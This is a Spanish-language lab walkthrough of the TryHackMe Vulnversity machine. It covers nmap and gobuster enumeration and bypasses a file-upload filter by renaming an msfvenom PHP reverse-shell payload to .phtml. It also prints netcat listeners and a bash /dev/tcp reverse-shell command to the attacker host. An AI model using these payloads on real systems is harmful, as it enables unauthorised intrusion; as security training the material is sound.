
----
- TAG: #Bypass #Restrcción #File #Upload
----
# Subida de Archivos Maliciosos y Bypass en Páginas Web

En este apartado, vamos a reforzar un poco la subida de archivos maliciosos a una página web. Practicaremos en una página web que no nos permita subir este tipo de archivos, para poder practicar sobre el **Bypass** y **Forzar la subida de una WebShell de un archivo malicioso a una máquina vulnerable**.

Para esto, vamos a necesitar:
1. Una máquina **Kali Linux**.
2. Máquina vulnerable de **TryHackMe** [Máquina Vulnversity](https://tryhackme.com/r/room/vulnversity).

Para esta práctica, vamos a necesitar tener una cuenta creada en **TryHackMe**.

Descargamos la **VPN** para posteriormente ir a nuestra terminal en Kali Linux y conectarnos a la VPN de la siguiente manera:

```bash
openvpn TunombreAqui.ovpn
```

Una vez dentro, realizamos un `ping -c 1` a la dirección de la máquina y tu dirección VPN de atacante. Si tenemos conectividad al hacer ping, significa que podemos realizar un escaneo con `nmap` con los siguientes parámetros:

```bash
nmap -p- -sS -sC -sV --open --min-rate=5000 -n -Pn -vvv 1.2.3.4 -oN escaneo
```

Después del escaneo, nos damos cuenta de que tiene un protocolo **http** corriendo por el puerto **3333**.

Nos dirigimos al navegador e ingresamos la dirección IP con el puerto abierto 3333. Nos muestra una página web universitaria. 

En este punto, lo primero que nos interesaría sería hacer un **Fuzzing Web** para poder encontrar directorios ocultos, como `/admin`, `/login`, `/passwords`, etc. 

Copiamos toda la dirección y realizamos el siguiente comando:

```bash
gobuster dir -u http://1.2.3.4:3333/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Al realizar esto, encontraremos el directorio `/internal`, así que lo pegamos al final de la **URL** y veremos que nos carga una página para poder subir archivos.

En blocs anteriores hemos visto cómo crear payloads maliciosos para poderlos subir como archivos `.php`, pero hay muchas páginas que no lo permiten ya que es un gran fallo de seguridad y esta máquina nos permite practicar con ese error.

Si creamos el payload con `msfvenom` con extensión `.php`, veremos que al querer subirlo nos saldrá un mensaje de error que dice "Extensión no permitida":

```bash
msfvenom -p php/reverse_php LHOST=1.2.3.4 LPORT=443 -f raw > pwned.php
```

Para estas ocasiones, podemos usar la extensión `.phtml` de `.php` mismo. Esto, en efectos prácticos, sería casi lo mismo; ahí entra en juego el **Bypass** ya que simulamos que el archivo `.phtml` es en realidad un `.php`.

Para ello, lo podemos cambiar de la siguiente manera:

```bash
mv pwned.php pwned.phtml
```

Ahora, si nos dirigimos de nuevo a la página y lo intentamos subir nuevamente con la extensión actualizada, veremos que saldrá "Success".

Ahora se preguntarán dónde se guardó este archivo. Pues lo buscamos realizando **Fuzzing** al directorio `/internal` con `gobuster`:

```bash
gobuster dir -u http://1.2.3.4:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Vemos que de primera nos muestra el directorio `uploads`, así que tratamos de ingresar por la **URL** y vemos que se encuentra nuestro archivo subido con extensión `.phtml`.

Enseguida, nos ponemos en escucha por el puerto **443** y le damos click al archivo que hemos subido en la dirección uploads:

```bash
nc -nlvp 443
```

Y si todo salió bien, efectivamente estaremos dentro de la máquina víctima realizando ese bypass. 😉

Recuerden que la sesión no suele durar mucho, así que debemos realizar el siguiente procedimiento:

Haremos una reverse shell y, para ello, primero debemos ponernos a la escucha por otro puerto diferente:

```bash
nc -nlvp 444
```

Desde aquí, recibimos la reverse shell. Para ello, tenemos la ayuda de esta página web [devshells](https://www.devshells.com), que nos ayuda creando el payload `sh -i >& /dev/tcp/1.2.3.4/4444 0>&1` y lo pegamos en la conexión que tenemos con netcat por el puerto 443:

```bash
nc -nlvp 443
bash -c "sh -i >& /dev/tcp/1.2.3.4/444 0>&1"
```

En otra terminal, abrimos el puerto **444** que se encuentra abierto y veremos que recibimos la conexión más estable.

Les recomiendo estudiar un poco el tema de las extensiones `.php` como la que vimos que fue `.phtml`.